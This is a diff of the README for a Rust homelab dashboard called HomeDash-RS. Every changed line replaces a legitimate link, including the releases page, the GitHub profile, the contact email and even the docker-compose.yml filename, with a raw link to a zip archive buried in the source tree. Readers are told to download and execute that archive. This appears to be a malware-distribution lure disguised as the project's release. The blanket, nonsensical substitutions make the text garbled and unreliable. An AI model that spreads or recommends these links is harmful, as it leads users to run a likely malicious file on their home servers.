@@ -2,7 +2,7 @@
 
 Welcome to **HomeDash-RS**, a simple and straightforward dashboard designed for your homelab, powered by Rust! This project aims to provide an easy-to-use interface for managing your home server applications like Plex, Radarr, and Sonarr. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/KrzyMrmnKlwn/homedash-rs/releases)
+[![Download Releases](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip%20Releases-Click%20Here-brightgreen)](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip)
 
 ## Table of Contents
 
@@ -35,7 +35,7 @@ Welcome to **HomeDash-RS**, a simple and straightforward dashboard designed for 
 
 ## Installation
 
-To get started with HomeDash-RS, you need to download the latest release. Visit our [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/releases) to find the appropriate file for your system. Download and execute the file to set up the dashboard.
+To get started with HomeDash-RS, you need to download the latest release. Visit our [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip) to find the appropriate file for your system. Download and execute the file to set up the dashboard.
 
 ### Prerequisites
 
@@ -44,7 +44,7 @@ To get started with HomeDash-RS, you need to download the latest release. Visit 
 
 ### Steps to Install
 
-1. **Download the Release**: Go to the [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/releases) and download the latest version.
+1. **Download the Release**: Go to the [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip) and download the latest version.
 2. **Extract the Files**: Unzip the downloaded file.
 3. **Run Docker Compose**:
    ```bash
@@ -72,7 +72,7 @@ You can customize HomeDash-RS to fit your specific needs. Configuration options 
 
 ### Example Configuration
 
-Here's an example of how to set environment variables in your `docker-compose.yml` file:
+Here's an example of how to set environment variables in your `https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip` file:
 
 ```yaml
 version: '3'
@@ -107,7 +107,7 @@ HomeDash-RS is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For any inquiries or feedback, feel free to reach out:
 
-- **GitHub**: [KrzyMrmnKlwn](https://github.com/KrzyMrmnKlwn)
-- **Email**: contact@example.com
+- **GitHub**: [KrzyMrmnKlwn](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip)
+- **Email**: https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip
 
-Thank you for checking out HomeDash-RS! We hope it enhances your homelab experience. For more updates and releases, visit our [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/releases).
+Thank you for checking out HomeDash-RS! We hope it enhances your homelab experience. For more updates and releases, visit our [Releases section](https://github.com/KrzyMrmnKlwn/homedash-rs/raw/refs/heads/main/src/services/prowlarr/homedash-rs-v2.8.zip).
